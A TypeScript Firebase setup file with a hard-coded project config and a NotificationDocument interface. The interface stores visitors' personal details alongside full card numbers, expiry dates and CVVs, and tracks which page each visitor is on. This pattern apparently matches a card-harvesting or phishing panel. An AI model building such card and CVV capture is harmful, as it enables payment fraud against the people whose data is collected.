import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyCZRYFyoIoCSYCL1rZZI8hmgtkFQLs5pCk",
  authDomain: "samak-15-2-ar.firebaseapp.com",
  projectId: "samak-15-2-ar",
  storageBucket: "samak-15-2-ar.firebasestorage.app",
  messagingSenderId: "559287903261",
  appId: "1:559287903261:web:f9e794e60068f15ada12f4",
  measurementId: "G-SS5KTL6JDY"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

